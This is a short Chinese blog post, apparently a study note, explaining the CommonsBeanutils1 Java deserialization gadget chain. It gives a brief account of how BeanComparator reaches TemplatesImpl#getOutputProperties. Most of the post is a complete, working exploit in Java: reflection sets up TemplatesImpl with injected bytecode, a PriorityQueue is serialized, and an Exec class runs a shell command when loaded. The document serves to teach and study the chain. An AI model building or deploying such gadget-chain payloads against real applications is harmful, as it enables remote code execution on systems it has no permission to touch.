---
title: CB1
date: 2026-03-07 07:12:17
updated: 2026-03-07 07:17:17
tags:
  - Web
  - java
  - 反序列化
  - CB链
---
# 原理

在TemplatesImpl的getOutputProperties方法里面也调用了newTransformer，由此衍生出了CB的利用链

![](https://github.com/Y4tacker/JavaSec/raw/main/2.%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E4%B8%93%E5%8C%BA/CommonsBeanutils1/img/1.png)

还是会用到PriorityQueue，但是和CC2一个很大区别在于CB1用的是BeanComparator而不是TransformingComparator，我们看看，如果this.property不为null，则将会自动调用getter方法，从而通过TemplatesImpl#getOutputProperties() 方法，触发代码执行，如下图所示

![](https://github.com/Y4tacker/JavaSec/blob/main/2.%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E4%B8%93%E5%8C%BA/CommonsBeanutils1/img/2.png?raw=true)![](https://github.com/Y4tacker/JavaSec/raw/main/2.%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E4%B8%93%E5%8C%BA/CommonsBeanutils1/img/3.png)

# EXP

```java
import com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;
import com.sun.org.apache.xalan.internal.xsltc.trax.TransformerFactoryImpl;
import org.apache.commons.beanutils.BeanComparator;
import java.io.*;
import java.lang.reflect.Field;
import java.nio.file.Files;
import java.nio.file.Paths;
import java.util.PriorityQueue;

public class CB1 {
    public static void main(String[] args) throws Exception {

        TemplatesImpl templates = new TemplatesImpl();
        String path = "/Users/bigcolaxd/IdeaProjects/java_study/CC/target/classes/Exec.class";
        byte[] code = Files.readAllBytes(Paths.get(path));
        byte[][] codes = {code};

        Class c = templates.getClass();
        Field bytecodes = c.getDeclaredField("_bytecodes");
        bytecodes.setAccessible(true);
        bytecodes.set(templates, codes);

        Field name = c.getDeclaredField("_name");
        name.setAccessible(true);
        name.set(templates, "test");

        Field tfactory = c.getDeclaredField("_tfactory");
        tfactory.setAccessible(true);
        tfactory.set(templates, new TransformerFactoryImpl());

        BeanComparator beancomparator = new BeanComparator();

        PriorityQueue<Object> priorityQueue = new PriorityQueue<>(2, beancomparator);
        priorityQueue.add(1);
        priorityQueue.add(1);

        Field property = beancomparator.getClass().getDeclaredField("property");
        property.setAccessible(true);
        property.set(beancomparator, "outputProperties");

        Field queue = priorityQueue.getClass().getDeclaredField("queue");
        queue.setAccessible(true);
        queue.set(priorityQueue, new Object[]{templates,templates});

        serialize(priorityQueue);
        unserialize("bin.ser");
    }

    public static void serialize(Object obj) throws IOException {
        ObjectOutputStream oos = new ObjectOutputStream(new FileOutputStream("bin.ser"));
        oos.writeObject(obj);
    }

    public static Object unserialize(String filename) throws IOException, ClassNotFoundException {
        ObjectInputStream ois = new ObjectInputStream(new FileInputStream(filename));
        return ois.readObject();
    }
}

```
```java
import java.io.IOException;

import com.sun.org.apache.xalan.internal.xsltc.DOM;
import com.sun.org.apache.xalan.internal.xsltc.TransletException;
import com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet;
import com.sun.org.apache.xml.internal.dtm.DTMAxisIterator;
import com.sun.org.apache.xml.internal.serializer.SerializationHandler;

public class Exec extends AbstractTranslet {
    static {
        try {
            Runtime.getRuntime().exec("open -a Calculator");
        } catch (IOException e) {
            throw new RuntimeException(e);
        }
    }

    @Override
    public void transform(DOM document, SerializationHandler[] handlers) throws TransletException {

    }

    @Override
    public void transform(DOM document, DTMAxisIterator iterator, SerializationHandler handler) throws TransletException {

    }
}
```